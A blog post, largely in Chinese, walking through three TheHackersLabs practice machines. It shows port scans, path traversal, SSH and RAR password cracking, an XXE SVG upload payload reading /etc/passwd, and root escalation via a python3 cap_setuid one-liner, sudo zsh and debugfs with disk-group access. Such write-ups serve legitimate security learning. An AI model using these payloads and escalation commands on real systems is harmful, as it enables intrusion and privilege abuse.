---
layout: post
title: the hackers labs notes
date: 2025-10-12 14:16 +0800
categories: 
  - permeation
tags: 
  - the hackers labs
image: /assets/img/backgrounds/thehackerslabs.png
---


> From now , I'm diving into stuff that actually fires me up - no more "shoulds," just pure curiosity.

## Tortuga

> **提示:** 靶机跳转传送门
[Tortuga](https://labs.thehackerslabs.com/machines/131)

<img src="/assets/img/thehackerslabs-notes/20251012150814_008.webp" alt="Tortugs" style="zoom:50%;" />

### 信息搜集

![img](/assets/img/thehackerslabs-notes/20251012150813_000.webp)

扫端口，发现22和80，简单访问下80端口

下面两个php文件，dirsearch爆破过其他路径，也失败了，接下来就看看能不能走参数

翻译了下这个`mapa.php`路由，感觉上是让我找文件，然后就爆破参数名的时候，不能把目标文件写我们测试的`mapa.php`，目前来看，`index.html`，`tripulacion.php`文件都可以

![img](/assets/img/thehackerslabs-notes/20251012150813_001.webp)

用burp爆破攻击就好了，发现参数名就是filename

![img](/assets/img/thehackerslabs-notes/20251012150813_002.webp)

look here,这是`http://10.161.253.201/mapa.php?filename=tripulacion.php`的结果，两个文件都显示出来了
> **警告:** 不能执行filename=mapa.php的原因是这会导致php无限递归包含，最后达到memory_limit后触发HTTP 500 Internal Server Error给我们，对我来说这个解释应该是没问题了


![img](/assets/img/thehackerslabs-notes/20251012150813_003.webp)

然后我们尝试/etc/passwd,可惜失败了，但是发现双写后就没有问题，可以进行路径穿越

![img](/assets/img/thehackerslabs-notes/20251012150813_004.webp)

但是只能本地进行路径穿越，我也拿不到shell，回到那个mapa.php，会发现他们加粗了用户名grumete，正好这个也是/etc/passwd上面出现的用户，接下来需要考虑ssh弱密码爆破了

![img](/assets/img/thehackerslabs-notes/20251012150813_005.webp)

成功爆破出来，拿到了userflag

读取那个.nota.txt，拿到了capitan的登录密码`mar_de_fuego123`（实质上这一步可以不用

暂时回到web服务，我看看，确认了，我前面的操作都没问题

![img](/assets/img/thehackerslabs-notes/20251012150813_006.webp)

### 提权

然后想办法提权root

通过linepeas，掌握了新的技能

![img](/assets/img/thehackerslabs-notes/20251012150814_007.webp)

```bash
capitan@TheHackersLabs-Tortuga:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
capitan@TheHackersLabs-Tortuga:~$ 
```

这里的`cap_setuid`能力集相较平时提权用的`suid`更厉害， 就是说它能分配`setuid(),setgid(),setresuid()`等特殊权限功能

```bash
capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Tortuga:~# cat /root/root.txt
c???????????????????????????ae
```

## ZAPP
> **提示:** 靶机跳转传送门
[ZAPP](https://labs.thehackerslabs.com/machines/143)

<img src="/assets/img/thehackerslabs-notes/zapp.png" alt="ZAPP" style="zoom:50%;" />

### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.167.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 22:11 CST
Nmap scan report for 10.161.167.222
Host is up (0.81s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

先分析下ftp协议

```bash
(base) yolo@yolo:~$ ftp 10.161.167.222
Connected to 10.161.167.222.
220 Welcome zappskred.
Name (10.161.167.222:yolo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!               delete          hash            mlsd            pdir            remopts         struct
$               dir             help            mlst            pls             rename          sunique
account         disconnect      idle            mode            pmlsd           reset           system
append          edit            image           modtime         preserve        restart         tenex
ascii           epsv            lcd             more            progress        rhelp           throttle
bell            epsv4           less            mput            prompt          rmdir           trace
binary          epsv6           lpage           mreget          proxy           rstatus         type
bye             exit            lpwd            msend           put             runique         umask
case            features        ls              newer           pwd             send            unset
cd              fget            macdef          nlist           quit            sendport        usage
cdup            form            mdelete         nmap            quote           set             user
chmod           ftp             mdir            ntrans          rate            site            verbose
close           gate            mget            open            rcvbuf          size            xferbuf
cr              get             mkdir           page            recv            sndbuf          ?
debug           glob            mls             passive         reget           status
ftp> ls
229 Entering Extended Passive Mode (|||58817|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
226 Directory send OK.
ftp> get login.txt
local: login.txt remote: login.txt
229 Entering Extended Passive Mode (|||6845|)
150 Opening BINARY mode data connection for login.txt (28 bytes).
100% |*******************************************************************|    28        5.08 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (3.04 KiB/s)
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||51043|)
150 Opening BINARY mode data connection for secret.txt (65 bytes).
100% |*******************************************************************|    65        9.05 KiB/s    00:00 ETA
226 Transfer complete.
65 bytes received in 00:00 (6.08 KiB/s)
ftp> bye
221 Goodbye.
(base) yolo@yolo:~$ ls
8c5852e6-56fe-4474-9fc7-70123454c347.gif  key      login.txt   nfspy_mount  pattern.txt  secret.txt  test1
Desktop                                   key.pub  miniforge3  ntfs.db      reports      snap        test2
(base) yolo@yolo:~$ cat login.txt
puerto
4444
coffee
GoodLuck
(base) yolo@yolo:~$ cat secret.txt
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```

匿名用户拿到两个文件，发现secret.txt是leet语言，解密说是小心烫的咖啡，没搞懂，接下来看看http呢？

审计源码，拿到了

```html
<div style="display:none">4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=</div>
```

进行4次base64解码，拿到了串字符，不晓得是什么，多次尝试，发现是一个路由

<img src="/assets/img/thehackerslabs-notes/image-20251102223447740.png" alt="image-20251102223447740" style="zoom:50%;" />

拿到了一个压缩包

<img src="/assets/img/thehackerslabs-notes/image-20251102223522660.png" alt="image-20251102223522660" style="zoom:50%;" />

怎么能是压缩的呢，不晓得密码是啥

### get flag

> 下面是参考老大的视频学习的：【thehackerlabs ZAPP靶机复盘-哔哩哔哩】 https://b23.tv/MdQIjKw

这里需要用rockyou进行爆破

```bash
~$ wget http://10.161.167.222/cuatrocuatroveces/Sup3rP4ss.rar
~$ rar2john Sup3rP4ss.rar > tmp
~$ john tmp --wordlist=/snap/seclists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 32 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
reema            (Sup3rP4ss.rar)
1g 0:00:00:19 DONE (2025-11-02 23:22) 0.05056g/s 4296p/s 4296c/s 4296C/s tracymcgrady..llandudno
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

拿到了压缩包密码

```bash
(base) yolo@yolo:~/Desktop/timu$ unrar x Sup3rP4ss.rar

UNRAR 7.00 freeware      Copyright (c) 1993-2024 Alexander Roshal


Extracting from Sup3rP4ss.rar

Enter password (will not be echoed) for Sup3rP4ss.txt:

Extracting  Sup3rP4ss.txt                                             OK
All OK
(base) yolo@yolo:~/Desktop/timu$ cat Sup3rP4ss.txt
Intenta probar con más >> 3spuM4 
```

哈哈，这里真难绷，都能硬控老大10多分钟，3spuM4是一个用户的密码，但是我们不晓得用户名，老大已经帮我测试了好多好多，最后发现是这里的`zappskred`

![image-20251102232650887](/assets/img/thehackerslabs-notes/image-20251102232650887.png)

这里的用户名我们前面见过一次的，是主机名

<img src="/assets/img/thehackerslabs-notes/image-20251102232807152.png" alt="image-20251102232807152" style="zoom:50%;" />

直接ssh远程登上去，拿到user.txt，接下来查看.bash_history，其实已经能知道rootflag是啥了，也能看得出来，这里出题人打算用sudoers出，直接拿root

```bash
zappskred@TheHackersLabs-ZAPP:~$ ls
user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
ZWwgbWVqb3?????????=
zappskred@TheHackersLabs-ZAPP:~$ cat .bash_history
ftp
sudo apt install ftp
sudo apt install vsftpd -y
sudo su
su
clear
sudo apt install vsftpd -y
ftpdç
ftpd
cd /etc/
ls
ip a
cls
clear
ip a
sudo dhclient
clear
ip a
sudo reboot now
cat /etc/sudoers
sudo cat /etc/sudoers
sudo su
sudo root
exit
clear
ifconfig
ip a
ssh-keygen -f '/home/kali/.ssh' -R '192.168.1.34'
ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
sudo ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
exit
clear
ls
clear
exit
clear
passwd
exit
clear
ls
cat
clear
sudo apt install zsh
exit
clear
whoami
sudo -l
clear
sudo zsh
sudo su
sudo root
exit
ls
sudo -l
sudo zsh
clear
echo "exitosocafe" | base64
exit
ls
ls -lash
cp user.txt user.txt
mv user.txt user.txt
rm user.txt
ls
clear
echo "el mejor cafe" | base64 > user.txt
ls
cd ..
system
apt install apache2
exit
clear
sudo zsh
clear
nano ~/.bashrc
cat /etc/issue
exit
sudo zsh
clear
sudo zsh
clear
sudo zsh
exit
echo '    ███████╗ █████╗ ██████╗ ██████╗
 ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
   ███╔╝ ███████║██████╔╝██████╔╝
  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝
 ███████╗██║  ██║██║     ██║
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

' | sudo tee /etc/issue.net > /dev/null
clear
sudo zsh
exit
sudo zsh
exit
zappskred@TheHackersLabs-ZAPP:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
[sudo] password for zappskred:
Sorry, try again.
[sudo] password for zappskred:
Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh
zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
TheHackersLabs-ZAPP# cat ~/root.txt
c2llbXByZSBlcyBudWV???????==
TheHackersLabs-ZAPP#
```

## Photographer

> **提示:** 靶机跳转传送门
[Photographer](https://labs.thehackerslabs.com/machines/142)

<img src="/assets/img/thehackerslabs-notes/photographer.png" alt="Photographer" style="zoom:50%;" />

### 信息搜集

IP 10.161.208.161

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:03 CST
Nmap scan report for 10.161.208.161
Host is up (0.0053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```

就两个端口，直接看web

dirsearch扫描过，发现了admin登录界面，但是账号密码都不清楚，尝试过sql注入，也失效，不喜欢爆破密码，再说同时爆破两处几乎不怎么会成功，接下来去研究有没有其他端口开放，比如说udp和tcp端口

```bash
(base) yolo@yolo:~$ sudo nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,514,631,1434 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:42 CST
Nmap scan report for 10.161.208.161
Host is up (0.0026s latency).

PORT     STATE         SERVICE
53/udp   closed        domain
67/udp   closed        dhcps
68/udp   open|filtered dhcpc
69/udp   closed        tftp
123/udp  closed        ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  closed        netbios-dgm
139/udp  closed        netbios-ssn
161/udp  open          snmp
162/udp  closed        snmptrap
445/udp  closed        microsoft-ds
514/udp  closed        syslog
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```

发现这里的snmp端口开放，相关介绍可以拜读下面的宝藏笔记

宝藏网站笔记https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html

```bash
(base) yolo@yolo:~$ snmpwalk -v 2c -c public 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No more variables left in this MIB View (It is past the end of the MIB tree)
(base) yolo@yolo:~$ snmpwalk -v 2c -c security 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."mycreds" = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
```

会发现这里，SNMP的只读社区字符串读取不到信息，只能在特权社区中去读取，应该是拿到了网站的账密，理由是ethan刚好在主页见过

<img src="/assets/img/thehackerslabs-notes/image-20251105215034702.png" alt="image-20251105215034702" style="zoom:50%;" />

### get shell

成功登录进来了

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css?v=1">
    <title>Admin</title>
</head>
<body>
	<div class="log-form">
		<h2>Subir Fotografía</h2>
	  	<form method="POST" action="upload.php" enctype="multipart/form-data">
			<input type="file" name="file" accept=".jpg,.png,.gif,.jpeg">
	    		<button type="submit" class="btn">Subir</button>
	  	</form>
	</div>

	<a href="/admin/logout.php" style="background: #b00020; color: #fff; text-decoration: none; padding: .5rem; margin-top: 1rem; display: inline-block;" >Cerrar sesión</a>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
</body>
</html>

```

发现是个文件上传，而且呢，~~这里只有前端限制，完全可以抓包再发~~

图片上传失败了，因为我发现上传的图片会自动打开，然后观察到这里用img标签解析，那么也许可以尝试下svg

<img src="/assets/img/thehackerslabs-notes/image-20251105221154546.png" alt="image-20251105221154546" style="zoom:50%;" />

look here

<img src="/assets/img/thehackerslabs-notes/image-20251105221030326.png" alt="image-20251105221030326" style="zoom:50%;" />

然后我研究了下，尝试的payload如下，可以读任意文件

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="20">&xxe;</text>
</svg>

```

先拿下upload.php，很疑惑，为啥能传svg文件

<img src="/assets/img/thehackerslabs-notes/image-20251105222247800.png" alt="image-20251105222247800" style="zoom:50%;" />

```php
<?php

function displayHTMLImage($imageFile)
{
    $type = mime_content_type($imageFile);

    switch ($type) {
        case 'image/jpg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/jpeg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/png':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/gif':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/svg+xml'://关注这里，启用外部实体加载，会直接输出svg内容
            libxml_disable_entity_loader(false);
	    $doc = new DOMDocument();
            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
	    $svg = $doc->getElementsByTagName('svg');
            echo $svg->item(0)->C14N();
            break;
        default:
            echo "Tipo de imagen no reconocida.";
    }
}

$target_dir = "./ethan_photographs/";

$fileName = date('ymd') . '_' . basename($_FILES["file"]["name"]);
$target_file = $target_dir . $fileName;


$contentType = $_FILES['file']['type'];
$MIMEtype = mime_content_type($_FILES['file']['tmp_name']);


if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "ExtensiÃ³n no permitida.";
    die();
}

if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Solo se permiten imagenes.";
    die();
}
//look here，发现后缀名仅仅看最后一个字母，恰好svg也是g结尾
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Solo se permiten imagenes.";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "Archivo demasiado grande.";
    die();
}

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "Ocurrio un error al subir el archivo.";
}
```

接下来关注下db.php，看有没有信息泄露

```php
<?php
$host = "localhost";
$db = "blog";
$user = "root";
$pass = "pjtF0533OPiSMQTGZacZY6jy$";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

```

拿到一个密码，应该就是服务器内部某个用户密码吧，看过/etc/passwd了，存在一个ethan

```bash
(base) yolo@yolo:~$ ssh ethan@10.161.208.161
The authenticity of host '10.161.208.161 (10.161.208.161)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.208.161' (ED25519) to the list of known hosts.
ethan@10.161.208.161's password:
Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer

Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
ethan@photographer:~$ ls
creds.txt  user.txt
```

这里的提权是通过disk用户组

```bash
ethan@photographer:~$ id
uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
```

网上找了个[教程](https://blog.csdn.net/2301_79518550/article/details/145452956)，使用/usr/sbin/debugfs成功读取root.txt

```bash
ethan@photographer:~$ ls -la /dev/sd*
brw-rw---- 1 root disk 8, 0 nov  5 14:00 /dev/sda
brw-rw---- 1 root disk 8, 1 nov  5 14:00 /dev/sda1
brw-rw---- 1 root disk 8, 2 nov  5 14:00 /dev/sda2
brw-rw---- 1 root disk 8, 5 nov  5 14:00 /dev/sda5
ethan@photographer:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  ls
debugfs:  cd /root
debugfs:  ls
debugfs:  cat root.txt
dc54639c5bd88637cc23dd7???????bf
debugfs:
```























